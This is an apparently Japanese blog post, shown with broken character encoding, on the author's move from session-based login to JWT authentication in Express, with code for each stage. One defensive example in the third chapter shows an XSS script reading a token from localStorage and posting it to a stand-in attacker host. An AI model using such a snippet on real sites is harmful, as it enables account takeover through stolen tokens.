# JWTèªè¨¼ã€œã€Œãƒ­ã‚°ã‚¤ãƒ³çŠ¶æ…‹ã‚’è¦šãˆã‚‹ã€ãŸã‚ã®é•·ã„æ—…è·¯ã€œ

> **å¯¾è±¡è€…**: ã€ŒãªãœJWTãªã®ï¼ŸCookieã˜ã‚ƒãƒ€ãƒ¡ãªã®ï¼Ÿã€ã¨ç–‘å•ã«æ€ã£ã¦ã„ã‚‹æ–¹  
> **ç§ã®ä½“é¨“**: èªè¨¼æ–¹å¼ã®å¤‰é·ã‚’å®Ÿéš›ã«çµŒé¨“ã—ã¦ç†è§£ã—ãŸã€ãã‚Œãã‚Œã®é•·æ‰€ã¨çŸ­æ‰€  
> **ä½œæˆæ—¥**: 2025-09-20

## ğŸ“– ç§ã®èªè¨¼æ–¹å¼éæ­´ã€œSession â†’ JWT â†’ ã®çœŸå®Ÿã€œ

### ç¬¬1ç« ï¼šæœ€åˆã®ãƒ­ã‚°ã‚¤ãƒ³æ©Ÿèƒ½ï¼ˆSessionæ–¹å¼ï¼‰

2019å¹´ã€åˆã‚ã¦ãƒ­ã‚°ã‚¤ãƒ³æ©Ÿèƒ½ã‚’å®Ÿè£…ã—ãŸæ™‚ã®ã“ã¨ã§ã™ã€‚

```javascript
// Express + Session ã®å®Ÿè£…
const session = require('express-session');

app.use(session({
  secret: 'my-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 3600000 }  // 1æ™‚é–“
}));

// ãƒ­ã‚°ã‚¤ãƒ³å‡¦ç†
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  
  if (user && bcrypt.compareSync(password, user.password)) {
    req.session.userId = user.id;  // ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ä¿å­˜
    res.json({ message: 'ãƒ­ã‚°ã‚¤ãƒ³æˆåŠŸ' });
  } else {
    res.status(401).json({ error: 'ãƒ­ã‚°ã‚¤ãƒ³å¤±æ•—' });
  }
});

// èªè¨¼ãŒå¿…è¦ãªAPI
app.get('/profile', (req, res) => {
  if (req.session.userId) {
    // ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã‚’å–å¾—
    const user = await User.findById(req.session.userId);
    res.json(user);
  } else {
    res.status(401).json({ error: 'æœªãƒ­ã‚°ã‚¤ãƒ³' });
  }
});
```

å…ˆè¼©ï¼šã€Œã„ã„ã­ï¼åŸºæœ¬çš„ãªå®Ÿè£…ã¯ã§ãã¦ã‚‹ã€
ç§ï¼šã€Œç°¡å˜ã§ã—ãŸï¼ã€

**ã§ã‚‚ã€1é€±é–“å¾Œã«å•é¡ŒãŒç™ºç”Ÿã—ã¾ã—ãŸ...**

---

### Sessionæ–¹å¼ã§å‡ºä¼šã£ãŸç¾å®Ÿã®å£

#### å•é¡Œ1ï¼šã€Œã‚µãƒ¼ãƒãƒ¼ã‚’å†èµ·å‹•ã—ãŸã‚‰ã¿ã‚“ãªãƒ­ã‚°ã‚¢ã‚¦ãƒˆã—ãŸï¼ã€

```javascript
// é–‹ç™ºä¸­ã®ç§
// ã‚µãƒ¼ãƒãƒ¼ã‚’å†èµ·å‹•
$ npm run dev

// ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰è‹¦æƒ…
ã€Œã•ã£ãã¾ã§ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ãŸã®ã«ã€æ€¥ã«ãƒ­ã‚°ã‚¢ã‚¦ãƒˆã•ã‚Œã¾ã—ãŸï¼ã€

// åŸå› ï¼šã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒãƒ¡ãƒ¢ãƒªã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹
// ã‚µãƒ¼ãƒãƒ¼å†èµ·å‹• = ãƒ¡ãƒ¢ãƒªã‚¯ãƒªã‚¢ = ã‚»ãƒƒã‚·ãƒ§ãƒ³æ¶ˆå¤±
```

**è§£æ±ºç­–ã‚’èª¿ã¹ã‚‹â†’ã€ŒRedisã«ä¿å­˜ã—ã‚ã€**

```javascript
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: 'my-secret-key',
  // ...
}));
```

ç§ï¼šã€ŒRedisã£ã¦ä½•ï¼Ÿã¾ãŸè¦šãˆã‚‹ã“ã¨ãŒå¢—ãˆãŸ...ğŸ˜µã€

#### å•é¡Œ2ï¼šã€Œãƒ¢ãƒã‚¤ãƒ«ã‚¢ãƒ—ãƒªã‹ã‚‰ä½¿ãˆãªã„ï¼ã€

2020å¹´ã€ReactNativeã§ãƒ¢ãƒã‚¤ãƒ«ã‚¢ãƒ—ãƒªã‚’ä½œã‚‹ã“ã¨ã«ãªã‚Šã¾ã—ãŸã€‚

```javascript
// React Nativeã‹ã‚‰
fetch('http://localhost:3000/api/profile')
  .then(res => res.json())
  .then(data => console.log(data));

// çµæœï¼š401 Unauthorized

// åŸå› ï¼šãƒ¢ãƒã‚¤ãƒ«ã‚¢ãƒ—ãƒªã¯ãƒ–ãƒ©ã‚¦ã‚¶ã˜ã‚ƒãªã„
// â†’ CookieãŒè‡ªå‹•ã§é€ã‚‰ã‚Œãªã„
// â†’ ã‚»ãƒƒã‚·ãƒ§ãƒ³èªè¨¼ãŒæ©Ÿèƒ½ã—ãªã„
```

ç§ï¼šã€Œãˆã£ã€åˆ¥ã®èªè¨¼æ–¹å¼ã‚’ä½œã‚‰ãªã„ã¨ã„ã‘ãªã„ã®ï¼Ÿã€

#### å•é¡Œ3ï¼šã€Œæœ¬ç•ªç’°å¢ƒã§ã‚¹ã‚±ãƒ¼ãƒ«ã—ãªã„ï¼ã€

```javascript
// ã‚µãƒ¼ãƒãƒ¼1å°ã®ã¨ã
ãƒ¦ãƒ¼ã‚¶ãƒ¼ â†’ ã‚µãƒ¼ãƒãƒ¼Aï¼ˆã‚»ãƒƒã‚·ãƒ§ãƒ³ä¿å­˜ï¼‰
         ã€Œãƒ­ã‚°ã‚¤ãƒ³ä¸­ã§ã™ã€

// ã‚µãƒ¼ãƒãƒ¼2å°ã«å¢—ã‚„ã—ãŸã¨ã  
ãƒ¦ãƒ¼ã‚¶ãƒ¼ â†’ ãƒ­ãƒ¼ãƒ‰ãƒãƒ©ãƒ³ã‚µãƒ¼ â†’ ã‚µãƒ¼ãƒãƒ¼Aï¼ˆã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚ã‚Šï¼‰
                          â†’ ã‚µãƒ¼ãƒãƒ¼Bï¼ˆã‚»ãƒƒã‚·ãƒ§ãƒ³ãªã—ï¼‰

// çµæœï¼šã©ã®ã‚µãƒ¼ãƒãƒ¼ã«æŒ¯ã‚Šåˆ†ã‘ã‚‰ã‚Œã‚‹ã‹ã§ã€
//      ãƒ­ã‚°ã‚¤ãƒ³çŠ¶æ…‹ãŒå¤‰ã‚ã£ã¦ã—ã¾ã†ï¼
```

è§£æ±ºç­–ï¼šã€Œã‚¹ãƒ†ã‚£ãƒƒã‚­ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã€ã‚„ã€Œå…±æœ‰ã‚»ãƒƒã‚·ãƒ§ãƒ³ã€

ç§ï¼šã€Œãªã‚“ã§ã“ã‚“ãªã«è¤‡é›‘ãªã®...ğŸ˜­ã€

---

### ç¬¬2ç« ï¼šJWTæ–¹å¼ã¨ã®å‡ºä¼šã„

ã‚ã‚‹æ—¥ã€å…ˆè¼©ãŒè¨€ã„ã¾ã—ãŸã€‚

å…ˆè¼©ï¼šã€ŒJWTã£ã¦çŸ¥ã£ã¦ã‚‹ï¼Ÿã€
ç§ï¼šã€Œã‚¸ãƒ§ãƒƒãƒˆï¼Ÿã€
å…ˆè¼©ï¼šã€Œã‚¸ã‚§ã‚¤ãƒ€ãƒ–ãƒªãƒ¥ãƒ¼ãƒ†ã‚£ãƒ¼ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ãƒ™ãƒ¼ã‚¹ã®èªè¨¼æ–¹å¼ã ã‚ˆã€

```javascript
// JWTèªè¨¼ã®ä»•çµ„ã¿
// 1. ãƒ­ã‚°ã‚¤ãƒ³æ™‚ï¼šã‚µãƒ¼ãƒãƒ¼ãŒãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œ
// 2. APIå‘¼ã³å‡ºã—æ™‚ï¼šã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒãƒˆãƒ¼ã‚¯ãƒ³ã‚’é€ä¿¡
// 3. ã‚µãƒ¼ãƒãƒ¼ï¼šãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ä¸è¦ï¼ï¼‰

// ãƒ­ã‚°ã‚¤ãƒ³å‡¦ç†ï¼ˆJWTç‰ˆï¼‰
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  
  if (user && bcrypt.compareSync(password, user.password)) {
    // JWTãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆ
    const token = jwt.sign(
      { userId: user.id, email: user.email },
      'secret-key',
      { expiresIn: '1h' }
    );
    
    res.json({ token });  // ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«è¿”ã™
  }
});

// èªè¨¼ãƒã‚§ãƒƒã‚¯ï¼ˆJWTç‰ˆï¼‰
app.get('/profile', authenticateToken, (req, res) => {
  // req.user ã«å¾©å·åŒ–ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ãŒå…¥ã£ã¦ã‚‹
  res.json(req.user);
});

function authenticateToken(req, res, next) {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'ãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚ã‚Šã¾ã›ã‚“' });
  }
  
  jwt.verify(token, 'secret-key', (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'ç„¡åŠ¹ãªãƒˆãƒ¼ã‚¯ãƒ³' });
    }
    req.user = user;
    next();
  });
}
```

ç§ï¼šã€ŒãŠï¼Ÿã“ã‚Œãªã‚‰ã‚µãƒ¼ãƒãƒ¼ãŒçŠ¶æ…‹ã‚’æŒãŸãªã„ï¼ã€

---

### JWTãŒã‚‚ãŸã‚‰ã—ãŸã€Œé­”æ³•ã€

#### é­”æ³•1ï¼šã‚µãƒ¼ãƒãƒ¼ãƒ¬ã‚¹ï¼ˆã‚¹ãƒ†ãƒ¼ãƒˆãƒ¬ã‚¹ï¼‰

```javascript
// Sessionæ–¹å¼
ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ â†’ ã‚µãƒ¼ãƒãƒ¼ï¼šã€Œç§ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã¯ ABC123 ã§ã™ã€
ã‚µãƒ¼ãƒãƒ¼ â†’ Redisï¼šã€ŒABC123ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ãã ã•ã„ã€
Redis â†’ ã‚µãƒ¼ãƒãƒ¼ï¼šã€Œãƒ¦ãƒ¼ã‚¶ãƒ¼ID: 456ã§ã™ã€
ã‚µãƒ¼ãƒãƒ¼ â†’ ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼šã€ŒOKã€ãƒ‡ãƒ¼ã‚¿ã‚’è¿”ã—ã¾ã™ã€

// JWTæ–¹å¼  
ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ â†’ ã‚µãƒ¼ãƒãƒ¼ï¼šã€Œç§ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ eyJ... ã§ã™ã€
ã‚µãƒ¼ãƒãƒ¼ï¼šã€Œãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç¢ºèª...OKã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ID: 456ã§ã™ã­ã€
ã‚µãƒ¼ãƒãƒ¼ â†’ ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼šã€Œãƒ‡ãƒ¼ã‚¿ã‚’è¿”ã—ã¾ã™ã€

// Redisã‚‚ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¿å­˜ã‚‚ä¸è¦ï¼
```

#### é­”æ³•2ï¼šãƒãƒ«ãƒãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ å¯¾å¿œ

```javascript
// Webã‚¢ãƒ—ãƒªï¼ˆReactï¼‰
localStorage.setItem('token', response.token);
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});

// ãƒ¢ãƒã‚¤ãƒ«ã‚¢ãƒ—ãƒªï¼ˆReact Nativeï¼‰  
AsyncStorage.setItem('token', response.token);
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${await AsyncStorage.getItem('token')}`
  }
});

// åŒã˜APIãŒä½¿ãˆã‚‹ï¼
```

#### é­”æ³•3ï¼šã‚¹ã‚±ãƒ¼ãƒ©ãƒ“ãƒªãƒ†ã‚£

```javascript
// ã©ã®ã‚µãƒ¼ãƒãƒ¼ã«æŒ¯ã‚Šåˆ†ã‘ã‚‰ã‚Œã¦ã‚‚å‹•ã
ãƒ¦ãƒ¼ã‚¶ãƒ¼ â†’ ãƒ­ãƒ¼ãƒ‰ãƒãƒ©ãƒ³ã‚µãƒ¼ â†’ ã‚µãƒ¼ãƒãƒ¼Aï¼ˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ï¼‰âœ…
                          â†’ ã‚µãƒ¼ãƒãƒ¼Bï¼ˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ï¼‰âœ…
                          â†’ ã‚µãƒ¼ãƒãƒ¼Cï¼ˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ï¼‰âœ…

// ã™ã¹ã¦ã®ã‚µãƒ¼ãƒãƒ¼ãŒåŒã˜ç§˜å¯†éµã‚’æŒã£ã¦ã„ã‚Œã°ã€
// ã©ã“ã§ã‚‚èªè¨¼ã§ãã‚‹ï¼
```

---

### ç¬¬3ç« ï¼šJWTã®è½ã¨ã—ç©´ã«è½ã¡ãŸæ—¥

ç§ï¼šã€ŒJWTæœ€é«˜ï¼ã‚‚ã†Sessionã«ã¯æˆ»ã‚Œãªã„ï¼ã€

**ã§ã‚‚ã€ç¾å®Ÿã¯ãã†ç”˜ããªã‹ã£ãŸ...**

#### è½ã¨ã—ç©´1ï¼šã€Œãƒ­ã‚°ã‚¢ã‚¦ãƒˆã§ããªã„ï¼ï¼Ÿã€

```javascript
// Sessionæ–¹å¼ã®ãƒ­ã‚°ã‚¢ã‚¦ãƒˆ
app.post('/logout', (req, res) => {
  req.session.destroy();  // ã‚»ãƒƒã‚·ãƒ§ãƒ³å‰Šé™¤
  res.json({ message: 'ãƒ­ã‚°ã‚¢ã‚¦ãƒˆæˆåŠŸ' });
});

// JWTæ–¹å¼ã®ãƒ­ã‚°ã‚¢ã‚¦ãƒˆ
app.post('/logout', (req, res) => {
  // ...ã©ã†ã™ã‚‹ï¼Ÿ
  // ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã«ã‚ã‚‹
  // ã‚µãƒ¼ãƒãƒ¼ã¯ã€Œã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ç„¡åŠ¹ã€ã¨è¨˜éŒ²ã§ããªã„
  res.json({ message: 'ãƒ­ã‚°ã‚¢ã‚¦ãƒˆæˆåŠŸï¼ˆï¼Ÿï¼‰' });
});

// å•é¡Œï¼šå¤ã„ãƒˆãƒ¼ã‚¯ãƒ³ãŒã¾ã æœ‰åŠ¹
// ãƒ¦ãƒ¼ã‚¶ãƒ¼Aï¼šã€Œãƒ­ã‚°ã‚¢ã‚¦ãƒˆã—ãŸã®ã«ã€ãªãœã‹ã¾ã ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹...ã€
```

**è§£æ±ºç­–ï¼šãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆ**

```javascript
const blacklistedTokens = new Set();

app.post('/logout', authenticateToken, (req, res) => {
  const token = req.headers['authorization'].split(' ')[1];
  blacklistedTokens.add(token);  // ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«è¿½åŠ 
  res.json({ message: 'ãƒ­ã‚°ã‚¢ã‚¦ãƒˆæˆåŠŸ' });
});

function authenticateToken(req, res, next) {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (blacklistedTokens.has(token)) {
    return res.status(401).json({ error: 'ãƒ­ã‚°ã‚¢ã‚¦ãƒˆæ¸ˆã¿' });
  }
  
  // JWTæ¤œè¨¼...
}
```

ç§ï¼šã€Œã‚ã‚Œï¼Ÿçµå±€ã‚µãƒ¼ãƒãƒ¼ãŒçŠ¶æ…‹ã‚’æŒã£ã¦ã‚‹...ğŸ˜…ã€

#### è½ã¨ã—ç©´2ï¼šã€Œãƒˆãƒ¼ã‚¯ãƒ³ãŒç›—ã¾ã‚ŒãŸã‚‰çµ‚ã‚ã‚Šã€

```javascript
// XSSæ”»æ’ƒã§JWTãŒç›—ã¾ã‚Œã‚‹ä¾‹
// æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒåŸ‹ã‚è¾¼ã¾ã‚ŒãŸå ´åˆ

<script>
  // localStorageã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€
  const stolenToken = localStorage.getItem('token');
  
  // æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡
  fetch('https://evil-hacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: stolenToken })
  });
</script>

// ç›—ã¾ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã§æ”»æ’ƒè€…ãŒAPIã«ã‚¢ã‚¯ã‚»ã‚¹
fetch('https://your-api.com/api/transfer', {
  headers: {
    'Authorization': `Bearer ${stolenToken}`
  },
  // ...
});
```

**è§£æ±ºç­–ï¼šã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã®å¤šé‡åŒ–**

```javascript
// 1. ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ï¼ˆçŸ­æœŸé–“ï¼‰+ ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ï¼ˆé•·æœŸé–“ï¼‰
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });

// 2. HttpOnly Cookieã§ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ä¿å­˜
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,      // JavaScriptã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ä¸å¯
  secure: true,        // HTTPSå¿…é ˆ
  sameSite: 'strict'   // CSRFæ”»æ’ƒå¯¾ç­–
});

// 3. CSRFãƒˆãƒ¼ã‚¯ãƒ³
// 4. ãƒ¬ãƒ¼ãƒˆåˆ¶é™
// ...
```

ç§ï¼šã€Œã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã€å¥¥ãŒæ·±ã™ãã‚‹...ğŸ˜µâ€ğŸ’«ã€

---

### ç¬¬4ç« ï¼šç¾å®Ÿçš„ãªJWTå®Ÿè£…ã€œmeal-voteã‹ã‚‰å­¦ã‚“ã ã“ã¨ã€œ

meal-voteãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ã¯ã€å®Ÿéš›ã«ä»¥ä¸‹ã®ã‚ˆã†ãªå®Ÿè£…ã«ãªã£ã¦ã„ã¾ã—ãŸï¼š

```typescript
// 1. ãƒˆãƒ¼ã‚¯ãƒ³ãƒšã‚¢æ–¹å¼
export interface TokenPair {
  accessToken: string;   // 15åˆ†
  refreshToken: string;  // 7æ—¥
}

// 2. ç’°å¢ƒå¤‰æ•°ã§ã®ç§˜å¯†éµç®¡ç†
const config = {
  jwtSecret: process.env.JWT_SECRET,
  jwtRefreshSecret: process.env.JWT_REFRESH_SECRET,
  jwtExpire: '15m',
  jwtRefreshExpire: '7d'
};

// 3. å½¹å‰²ãƒ™ãƒ¼ã‚¹ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡
const payload: JWTPayload = {
  userId: user._id.toString(),
  email: user.email,
  role: user.role,        // admin or member
  familyId: user.familyId.toString()
};

// 4. ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã§ã®èªè¨¼
export const authenticate = async (req, res, next) => {
  try {
    const token = extractTokenFromHeader(req.headers.authorization);
    const decoded = verifyAccessToken(token);
    
    // ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼å­˜åœ¨ç¢ºèªï¼ˆé‡è¦ï¼ï¼‰
    const user = await User.findById(decoded.userId);
    if (!user) {
      return res.status(401).json({ error: 'ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“' });
    }
    
    req.user = user;
    next();
  } catch (error) {
    res.status(401).json({ error: 'èªè¨¼å¤±æ•—' });
  }
};
```

---

### ç§ãŒå­¦ã‚“ã æ•™è¨“

#### 1. ã€Œå®Œç’§ãªèªè¨¼æ–¹å¼ã€ã¯å­˜åœ¨ã—ãªã„

- **Session**: ã‚µãƒ¼ãƒãƒ¼è² è·ã€ã‚¹ã‚±ãƒ¼ãƒ©ãƒ“ãƒªãƒ†ã‚£ã®å•é¡Œ
- **JWT**: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã€ãƒ­ã‚°ã‚¢ã‚¦ãƒˆå•é¡Œ
- **ã©ã¡ã‚‰ã‚‚**: æ­£ã—ãå®Ÿè£…ã™ã‚Œã°å®‰å…¨

#### 2. è¦ä»¶ã«å¿œã˜ã¦é¸æŠã™ã‚‹

```javascript
// Sessionæ–¹å¼ãŒå‘ã„ã¦ã„ã‚‹å ´åˆ
- ä¸»ã«Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³
- ã‚µãƒ¼ãƒãƒ¼å°æ•°ãŒå°‘ãªã„
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’æœ€é‡è¦–
- å³åº§ã«ã‚»ãƒƒã‚·ãƒ§ãƒ³ç„¡åŠ¹åŒ–ãŒå¿…è¦

// JWTæ–¹å¼ãŒå‘ã„ã¦ã„ã‚‹å ´åˆ  
- ãƒãƒ«ãƒãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ï¼ˆWeb + Mobileï¼‰
- ãƒã‚¤ã‚¯ãƒ­ã‚µãƒ¼ãƒ“ã‚¹
- CDNãƒ»åˆ†æ•£ã‚­ãƒ£ãƒƒã‚·ãƒ¥æ´»ç”¨
- ã‚¹ã‚±ãƒ¼ãƒ©ãƒ“ãƒªãƒ†ã‚£é‡è¦–
```

#### 3. ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¯å¤šå±¤é˜²å¾¡

```javascript
// JWTä½¿ã†ãªã‚‰å¿…é ˆ
- çŸ­æœŸé–“ã®ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³
- ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ãƒ­ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³
- HTTPSå¿…é ˆ
- XSSå¯¾ç­–ï¼ˆCSP, ã‚µãƒ‹ã‚¿ã‚¤ã‚ºï¼‰
- CSRFå¯¾ç­–
- ãƒ¬ãƒ¼ãƒˆåˆ¶é™
```

#### 4. å®Ÿè£…ã¯æ®µéšçš„ã«

```javascript
// Phase 1: åŸºæœ¬å®Ÿè£…
- JWTã®ç”Ÿæˆã¨æ¤œè¨¼
- ãƒ­ã‚°ã‚¤ãƒ³ãƒ»ãƒ­ã‚°ã‚¢ã‚¦ãƒˆ

// Phase 2: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–
- ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³
- ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆ

// Phase 3: é‹ç”¨æ”¹å–„
- ãƒ­ã‚°ã¨ãƒ¢ãƒ‹ã‚¿ãƒªãƒ³ã‚°
- ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æœ€é©åŒ–
```

---

## ã¾ã¨ã‚ï¼šèªè¨¼ã¯ã€Œä½“é¨“ã€ã‹ã‚‰ç†è§£ã™ã‚‹

æ•™ç§‘æ›¸ã‚„ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§ç†è«–ã‚’å­¦ã¶ã“ã¨ã‚‚å¤§åˆ‡ã§ã™ãŒã€
èªè¨¼æ–¹å¼ã®æœ¬å½“ã®é•ã„ã¯ã€å®Ÿéš›ã«å®Ÿè£…ã—ã¦é‹ç”¨ã—ã¦ã¿ãªã„ã¨åˆ†ã‹ã‚Šã¾ã›ã‚“ã€‚

ç§ã‚‚æœ€åˆã¯ã€Œãªã‚“ã§JWTãªã®ï¼Ÿã€ã¨æ€ã„ã¾ã—ãŸãŒã€
Sessionã®é™ç•Œã‚’ä½“é¨“ã—ã¦ã€JWTã®å¿…è¦æ€§ã‚’ç†è§£ã—ã¾ã—ãŸã€‚

ãã—ã¦JWTã®è½ã¨ã—ç©´ã«ã‚‚è½ã¡ã¦ã€ã€Œå®Œç’§ãªè§£æ±ºç­–ã¯ãªã„ã€ã“ã¨ã‚‚å­¦ã³ã¾ã—ãŸã€‚

**å¤§åˆ‡ãªã®ã¯**ï¼š
- ãªãœãã®æŠ€è¡“ãŒç”Ÿã¾ã‚ŒãŸã®ã‹ã‚’ç†è§£ã™ã‚‹
- å®Ÿéš›ã«æ‰‹ã‚’å‹•ã‹ã—ã¦ä½“é¨“ã™ã‚‹
- ãƒˆãƒ¬ãƒ¼ãƒ‰ã‚ªãƒ•ã‚’å—ã‘å…¥ã‚Œã‚‹
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’æ„è­˜ã—ç¶šã‘ã‚‹

æ¬¡ã«JWTã‚’å®Ÿè£…ã™ã‚‹ã¨ãã¯ã€ç§ã®ã‚ˆã†ãªå›ã‚Šé“ã‚’ã—ãªãã¦æ¸ˆã‚€ã‚ˆã†ã«ã€
ã“ã®çµŒé¨“ãŒå½¹ã«ç«‹ã¦ã°å¬‰ã—ã„ã§ã™ã€‚

---

> **Tags**: #JWT #èªè¨¼ #Session #ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ #å®Ÿè£…ä½“é¨“ #å­¦ç¿’ãƒãƒ¼ãƒˆ #ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ #å¤±æ•—è«‡

> **é–¢é€£ãƒšãƒ¼ã‚¸**: [[REST_APIè¨­è¨ˆ_åŸºç¤ã¨å®Ÿè·µ]] | [[CORS_ãªãœãƒ–ãƒ©ã‚¦ã‚¶ã¯ä»–ã®ã‚µã‚¤ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’å«ŒãŒã‚‹ã®ã‹]]